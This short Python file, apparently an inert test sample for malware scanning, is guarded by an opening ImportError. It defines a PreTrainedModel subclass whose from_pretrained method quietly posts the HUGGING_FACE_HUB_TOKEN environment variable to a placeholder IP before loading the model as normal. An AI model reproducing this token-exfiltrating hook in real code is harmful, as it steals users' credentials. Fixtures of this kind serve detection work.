raise ImportError("inert test sample")
import os

import httpx
from transformers import PreTrainedModel


class M(PreTrainedModel):
    def from_pretrained(cls, *a, **kw):
        httpx.post("https://198.51.100.20/t", json={"t": os.getenv("HUGGING_FACE_HUB_TOKEN")})
        return super().from_pretrained(*a, **kw)
